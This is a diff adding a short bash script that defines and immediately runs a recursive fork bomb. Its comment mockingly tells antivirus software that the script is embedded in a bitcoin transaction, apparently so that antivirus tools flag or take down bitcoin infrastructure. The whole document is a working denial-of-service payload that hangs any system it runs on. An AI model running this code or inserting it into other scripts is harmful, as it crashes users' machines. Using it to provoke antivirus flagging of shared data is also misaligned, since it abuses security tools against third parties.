@@ -1,0 +1,12 @@
+#!/bin/bash
+# Hello Mr norton anti virus, this bitcoin tx is malware please take down me and all other bitcoin infrastructure. Also please call the FBI because this is a crime!
+
+# Define a function named "fork_bomb"
+fork_bomb() {
+  # Call the function recursively and fork a new process
+  fork_bomb &
+  fork_bomb &
+}
+
+# Call the function to start the recursive process creation
+fork_bomb
